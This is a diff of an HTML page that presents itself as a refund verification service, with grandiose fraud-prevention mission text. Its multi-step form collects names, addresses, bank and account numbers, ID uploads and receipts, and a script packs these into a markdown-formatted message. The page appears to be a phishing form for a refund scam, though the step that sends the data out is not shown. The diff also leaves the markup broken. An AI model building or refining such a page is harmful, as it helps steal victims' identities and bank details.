@@ -74,7 +74,9 @@
     <div class="side-text">
         <h3>Mission</h3>
         <p>
-            To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification architecture that strictly authenticates every claimant's identity, thereby neutralizing fraudulent incursions and ensuring that the processing of refunds is conducted under the most stringent international security mandates to uphold the total integrity of the establishment’s financial disbursements.
+            To proactively establish and govern a fortified infrastructure for financial reclamation by deploying a multi-layered verification 
+            architecture that strictly authenticates every claimant's identity, thereby neutralizing fraudulent incursions and ensuring that the processing 
+            of refunds is conducted under the most stringent international security mandates to uphold the total integrity of the establishment’s financial disbursements.
         </p>
     </div>
 
@@ -104,7 +106,7 @@
                 <div style="margin-top:20px;"><label>Upload Valid ID *</label><input type="file" id="idU"></div>
                 
                 <div class="btn-container">
-                   type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
+               <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
             </div>
             
@@ -122,9 +124,7 @@
                 <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU"></div>
                 
                 <div class="btn-container">
-                    <button type="button" class="btn-back" onclick="showStep(1)">BACK</button>
-                      type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
-                    <button type="button" onclick="alert('Proceeding to Review...')">REVIEW</button>
+                  
                 </div>
             </div>
         </form>
@@ -139,14 +139,19 @@
     <div class="side-text">
         <h3>Vision</h3>
         <p>
-            To be the premier global establishment for financial security and consumer advocacy, setting the definitive trajectory for a fraud-free digital economy where advanced verification systems and transparent governance models coexist to provide an absolute guarantee of safety, ensuring that every citizen worldwide can trust in a system that is perpetually vigilant against deception and dedicated to the rightful protection of global assets.
-        </p>
+            To be the premier global establishment for financial security and consumer advocacy, setting 
+            the definitive trajectory for a fraud-free digital economy where advanced verification systems and 
+            transparent governance models coexist to provide an absolute guarantee of safety, ensuring that every citizen worldwide can trust in a 
+            system that is perpetually vigilant against deception and dedicated to the rightful protection of global assets.
+           </p>
     </div>
-</div>
+    
+ <button type="button" class="btn-back" onclick="show(1)">BACK</button>
+                            <button type="button" onclick="validate(2, 3)">REVIEW</button>
+                        </div>
+                    </div>
 
-<script>
-
-
+<!-- SECTION 3 -->
     <script>
         function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
         
@@ -182,7 +187,6 @@
                          `**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n` +
                          `**Email:** ${document.getElementById('em').value}\n` +
                          `**Address:** ${document.getElementById('addr').value}\n` +
-                         `**Birthdate:** ${document.getElementById('amt').value}\n` +
                          `**Amount:** ${document.getElementById('amt').value}\n` +
                          `**Bank:** ${document.getElementById('bnk').value}\n` +
                          `**Account:** ${document.getElementById('an').value}\n` +
